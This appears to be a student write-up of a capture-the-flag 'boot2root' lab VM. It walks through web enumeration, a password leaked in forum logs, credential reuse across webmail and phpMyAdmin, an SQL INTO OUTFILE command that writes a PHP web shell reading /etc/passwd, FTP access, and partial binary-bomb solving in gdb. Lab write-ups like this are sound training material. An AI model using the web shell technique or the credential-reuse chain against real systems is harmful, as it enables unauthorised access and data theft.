In the dirb result we found some url on the local server running on the machine.

The main ones are a phpmyadmin page, a forum and a webmail

Looking at the forum and exploring the topics we found one called : "probleme login ?" from lmezard.
There is a huge text coming from what it looks like a log file of different access with everytime an
error for the password of the user.
But in the middle of the text, there is a weird string :

Oct 5 08:45:29 BornToSecHackMe sshd[7547]: Failed password for invalid user !q\]Ej?*5K5cy*AJ from 161.202.39.38 port 57764 ssh2

the !q\]Ej?*5K5cy*AJ is a bit weird. This doesn't look like a username to me but more of a password.
Let's try to connect us on the machine. Trying with the different username found in the log : adam, admin, nagios, guest, ubnt, test, ftpuser

But nothing works to connect on the VM.
Remember we tried to login with the password : !q\]Ej?*5K5cy*AJ

We can connect on the forum too, let's try with the username we found and the same password. Same result, nothing works.

There is one last name we didn't try. The author of the original post : lmezard

And it works ! We can login on lmezard's account with the password : !q\]Ej?*5K5cy*AJ

Exploring the rest of the forum logged as lmezard we discovered that in our profile page, we have an email !

This email is : laurie@borntosec.net

So now we can login on the forum.
With dirb we found that there is a webmail service running on the machine : Squirrel Mail

Accessing https://[IP]/webmail

We need to input a username and a password.

Let's try the same username + password from the forum.
We are now connected on the email service and there are 2 emails on the account.

The first one'subject is "very interesting!!!" but the content of the email is not.
However the last one received is waaaaaaaay more interesting.

Here is the email :

"Subject:  	DB Access
From:  	qudevide@mail.borntosec.net
Date:  	Thu, October 8, 2015 11:25 pm
To:  	laurie@borntosec.net
Priority:  	Normal

Hey Laurie,

You cant connect to the databases now. Use root/Fg-'kKXBj87E:aJ$

Best regards."

There is a login/password to connect to the database ?
With dirb we knew there is a phpmyadmin page, but we didn't have the username and password to log in.
Let's try with the one from the email.

It works ! We can connect to the phpmyadmin as root.

root : Fg-'kKXBj87E:aJ$

Now logged as root on the phpmyadmin page, we can test some SQL command.

SELECT @ @version
5.5.44-0ubuntu0.12.04.1

Looking online on how to exploit Phpmyadmin as root user we found that we can call a SQL command to create a php file and 
call shell_exec and execute some bash command and print the result in a file.
source : https://www.netspi.com/blog/technical/network-penetration-testing/linux-hacking-case-studies-part-3-phpmyadmin/

After few tries we found the right way to call it :

select '<?php $output = shell_exec('cat /etc/passwd'); echo $output ?>' into outfile '/var/www/forum/templates_c/passwd.php'

Then after sneaking around calling ls, pwd ...etc we found in the /home directory some subdirectories related to others users :

LOOKATME ft_root laurie laurie@borntosec.net lmezard thor zaz

In the LOOATME directory we can found a file called password and we have in it a login/password related to user lmezard:

lmezard:G!@M6f4Eatau{sF"

Of course these credidentials are not valid to log on Boot2root machine, it's a FTP account (we knew there was a ftp service
running thanks to nmap).

Login in FTP we could connect on the machine :

ftp 192.168.56.103

Going in to pass mode we can list the directory :

tp 192.168.56.103
Connected to 192.168.56.103.
220 Welcome on this server
Name (192.168.56.103:user42): lmezard
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
500 Illegal PORT command.
ftp: bind: Address already in use
ftp> pass
Passive mode on.
ftp> ls
227 Entering Passive Mode (192,168,56,103,46,195)
150 Here comes the directory listing.
-rwxr-x---    1 1001     1001           96 Oct 15  2015 README
-rwxr-x---    1 1001     1001       808960 Oct 08  2015 fun
226 Directory send OK.
ftp>

And now we can get the README and fun files.

fun isn't a file, it's a hidden tar
Renaming in fun.tar and now we can extract its content,
resulting in a ft_fun directory with 739 .pcap files

Looking at few files we found that it looks like C code
but splitted in hundreads of files.
But what does it do ? Let's find the main function

int main() {
	printf("M");
	printf("Y");
	printf(" ");
	printf("P");
	printf("A");
	printf("S");
	printf("S");
	printf("W");
	printf("O");
	printf("R");
	printf("D");
	printf(" ");
	printf("I");
	printf("S");
	printf(":");
	printf(" ");
	printf("%c",getme1());
	printf("%c",getme2());
	printf("%c",getme3());
	printf("%c",getme4());
	printf("%c",getme5());
	printf("%c",getme6());
	printf("%c",getme7());
	printf("%c",getme8());
	printf("%c",getme9());
	printf("%c",getme10());
	printf("%c",getme11());
	printf("%c",getme12());
	printf("\n");
	printf("Now SHA-256 it and submit");
}

That's interesting. We have the last 5 char of the password.
Because we can reach functions getme8() to getmet12().
It means we have : 

XXXXXXXwnage

Grepping on the content of all the files to look for 'return'

We get :

cat merge | grep 'return'
//file483	return 'a';
//file697	return 'I';
	return 'w';
	return 'n';
	return 'a';
	return 'g';
	return 'e';
//file161	return 'e';
//file252	return 't';
//file163	return 'p';
//file640	return 'r';
//file3	return 'h';

Our first past of the password contains aIetrh

With a little bit of swap and guessing the password that got out was

Iheartpwnage

We have to hash this with SHA-256 and we should be able to log as laurie on the machine.

330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4

We are now logged as laurie on boot2root

In the home directory there is a readme and an executable called
bomb.
Executing it, it waits for the user to give a value and read the stin.

Thanks to gdb, we can explore in details and we discoered that there
are 6 phase.
We can access the phase_1 of the program with a breakpoint,
at phase_1 + 26 and change the value of eax to 0 (set to 1).
This let us pass and defuse the phase 1.

Now for phase_2, again the program waits for a user entry
Adding a breakpoint at phase_2 + 46 and phase_2 + 68 
we can understand that we need to give 6 parameters to the function
It's a factorial series of 6
1 2 6 24 120 720


